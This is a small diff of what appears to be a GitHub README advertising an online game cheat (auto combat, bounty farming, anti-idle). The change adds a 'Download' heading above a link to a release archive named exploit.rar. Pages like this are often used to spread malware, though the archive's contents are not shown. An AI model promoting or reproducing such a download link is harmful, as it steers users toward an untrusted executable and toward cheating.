@@ -39,7 +39,7 @@ Track and defeat high bounty players. Gain bounty fast using auto combat logic.
 Stay in-game forever with built-in anti-idle and auto reconnect after crashes or kicks.
 
 ![image](https://github.com/user-attachments/assets/546fec7f-67d7-49db-991d-edd89ee90ab4)
-
+## 🚀 Download
 [CLICK FOR A DOWNLOAD CHEAT](https://github.com/donk25/script/releases/download/new/exploit.rar)
 
 ## 🛡 Safe & Updated
